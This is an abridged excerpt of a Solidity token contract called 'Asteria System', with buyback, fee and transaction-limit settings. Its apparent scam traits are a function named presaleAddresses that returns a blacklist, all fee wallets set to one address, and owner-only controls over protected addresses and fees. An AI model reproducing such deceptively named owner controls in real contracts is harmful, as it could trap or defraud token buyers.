...
contract Ownable is Context {
  ...
  function rewards() public virtual {
...
contract Asteria is Context, IERC20, Ownable {
  using SafeMath for uint256;
  using Address for address;


  address payable public marketingAddress = payable(0xA22243C40a7DcbbD7f15a4a5AB037E5532EB7A12);
  address payable public developmentAddress = payable(0xA22243C40a7DcbbD7f15a4a5AB037E5532EB7A12);
  address payable public charityAddress = payable(0xA22243C40a7DcbbD7f15a4a5AB037E5532EB7A12);
  address payable public vaultRewardAddress = payable(0xA22243C40a7DcbbD7f15a4a5AB037E5532EB7A12);
  ...
  string private constant _name = "Asteria System";
  string private constant _symbol = "Asteria";
  ...
  uint256 _intervalMinutesForSwap = 1 * 1 minutes;

  uint256 _buyBackRangeRate = 80;
  ...
  uint256 _bMaxTxAmount = 100000000  * 10**9;
  uint256 _sMaxTxAmount = 100000000  * 10**9;
  ...
  uint256 _buyBackDivisor = 10;
  uint256 _buyBackTimeInterval = 5 minutes;
  ...
  bool _isEnabledBuyBackAndBurn = true;
  ...
  constructor () {
    ...
    addToFounder(uniswapV2Pair);
    addToFounder(deadAddress);
  ...
  function addToFounder(address account) public onlyOwner() {
  ...
  function presaleAddresses() external view returns (address[] memory) {
    return _blacklist;
  }
  function addToAirdrop(address account) external onlyOwner returns (bool) {
  ...
  function setProtectedAddresses(address account)
  external
  onlyOwner
  returns (bool)
  {
  ...
  function GetSwapMinutes() view public returns(uint256) {
  ...
  function prepareForPreSale() external onlyOwner {
    ...
    _vaultFee = 0;
    _liquidityFee = 0;
    _bMaxTxAmount = 100000000 * 10**9;
    _sMaxTxAmount = 100000000 * 10**9;
  }
